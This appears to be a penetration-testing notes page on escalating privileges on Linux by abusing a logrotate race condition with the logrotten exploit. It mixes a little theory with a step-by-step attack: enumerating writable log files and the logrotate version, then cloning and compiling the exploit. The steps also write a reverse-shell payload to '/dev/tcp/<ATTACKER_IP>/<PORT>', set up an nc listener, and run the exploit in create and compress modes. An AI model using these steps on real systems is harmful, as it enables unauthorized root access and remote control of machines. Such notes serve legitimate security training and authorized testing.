---
Primary_category: "[[LINUX PRIVESC]]"
title: "LOGROTATE ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *Theory*

##### *Configuration Files*

```bash
/etc/logrotate.conf # Main Configuration File
/etc/logrotate.d # Additional Configuration Files
/var/lib/logrotate.status
```

##### *Service Configuration Parameters*

| **DIRECTIVE** | **DESCRIPTION** |
| --- | --- |
| **`weekly` <br> `daily`** <br> **`monthly`** <br> **`yearly`** | ***Specifies the rotational frequency ( e.g. `weekly` → At most once a week )*** |
| **`rotate N`** | ***Keeps N rotation before deleting the oldest one*** |
| **`create`** | ***After renaming the given log file, it creates a new empty file with the same name*** |
| **`compress`** | ***Compresses the old rotated logs*** |

---

#### *Abuse*

##### *Race Condition*

> ***Vulnerable Versions → 3.8.6, 3.11.0, 3.15.0 and 3.18.0***

> ***[LogRotten](https://github.com/whotwagner/logrotten)***

###### *Requirements*

- ***Write permissions on the Log Files Path***
- ***LogRotate must run as Root or another privileged user***
- ***LogRotate binary must be vulnerable ( Check versions above )***

###### *Enumeration*

> ***From the Target*** 🎯

- ***LogRotate Version***

```bash
logrotate -v
```

- ***Log files for which the current user has write permissions***

```bash
find / -regextype posix-extended -iregex '.*(\.|_)log' -writable 2> /dev/null
```

###### *Cloning the Github Repository*

> ***From the Attacker*** ⚔️

```bash
git clone https://github.com/whotwagner/logrotten logrotten
```

###### *Compiling the Binary*

> ***From the Target ( If possible )*** 🎯

```bash
cd !$ && gcc -o logrotten logrotten.c
```

```bash
chmod 700 ./logrotten
```

###### *Creating the Payload*

> ***From the Target*** 🎯

```bash
echo 'bash -i &> /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > payload
```

###### *Checking LogRotate Option*

> ***Create or Compress***

> ***From the Target*** 🎯

```bash
grep -RiP --color -- "^[^#]*(create|compress)" /etc/logrotate.conf /etc/logrotate.d/ 2> /dev/null
```

###### *Setting a TCP Listener*

> ***From the Attacker*** ⚔️ 

```bash
nc -nlvp <PORT>
```

###### *Running the exploit*

> ***From the Target*** 🎯

- ***Create***

```bash
./logrotten -p ./payload /tmp/pwnme.log
```

- ***Compress***

```bash
./logrotten -p ./payload -c -s 4 /tmp/pwnme.log
```

###### *Resources*

***[Linux Privesc with LogRotate Utility](https://medium.com/r3d-buck3t/linux-privesc-with-logrotate-utility-219b3aa7476b)***

***[Details of a Logrotate Race Condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)***

***[Abusing a Race Condition in Logrotate to Privesc](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)***